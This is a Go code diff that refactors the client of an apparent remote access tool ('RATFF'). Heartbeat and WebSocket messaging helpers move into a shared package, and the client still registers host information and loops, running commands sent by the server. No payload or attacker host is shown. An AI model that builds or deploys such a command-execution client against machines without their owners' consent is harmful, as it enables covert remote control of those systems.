@@ -1,7 +1,6 @@
 package main
 
 import (
-	"encoding/json"
 	"time"
 
 	"RATFF/shared"
@@ -20,11 +19,11 @@ func runClient(serverURL, clientID string) error {
 	}
 	defer conn.Close()
 
-	setupHeartbeat(conn)
+	shared.SetupHeartbeat(conn)
 
 	info := shared.BuildClientInfo(clientID)
 	msg := shared.NewMessage(shared.MsgRegister, "", clientID, info.ToPayload())
-	if err := sendMessage(conn, msg); err != nil {
+	if err := shared.SendWSMessage(conn, msg); err != nil {
 		return err
 	}
 
@@ -33,57 +32,20 @@ func runClient(serverURL, clientID string) error {
 	return messageLoop(conn)
 }
 
-// setupHeartbeat configures ping/pong for the WebSocket connection.
-func setupHeartbeat(conn *websocket.Conn) {
-	_ = conn.SetReadDeadline(time.Now().Add(60 * time.Second))
-	conn.SetPongHandler(func(string) error {
-		_ = conn.SetReadDeadline(time.Now().Add(60 * time.Second))
-		return nil
-	})
-
-	go func() {
-		ticker := time.NewTicker(30 * time.Second)
-		defer ticker.Stop()
-		for range ticker.C {
-			if err := conn.WriteMessage(websocket.PingMessage, nil); err != nil {
-				return
-			}
-		}
-	}()
-}
-
 // messageLoop continuously reads and processes messages from the server.
 func messageLoop(conn *websocket.Conn) error {
 	for {
 		var msg shared.Message
-		if err := readMessage(conn, &msg); err != nil {
+		if err := shared.ReadWSMessage(conn, &msg); err != nil {
 			return err
 		}
 
 		resp := executeCommand(msg)
 
-		if err := sendMessage(conn, resp); err != nil {
+		if err := shared.SendWSMessage(conn, resp); err != nil {
 			return err
 		}
 	}
-}
-
-// sendMessage marshals and sends a message over WebSocket.
-func sendMessage(conn *websocket.Conn, msg shared.Message) error {
-	data, err := json.Marshal(msg)
-	if err != nil {
-		return err
-	}
-	return conn.WriteMessage(websocket.TextMessage, data)
-}
-
-// readMessage reads and unmarshals a WebSocket message.
-func readMessage(conn *websocket.Conn, msg *shared.Message) error {
-	_, data, err := conn.ReadMessage()
-	if err != nil {
-		return err
-	}
-	return json.Unmarshal(data, msg)
 }
 
 func main() {
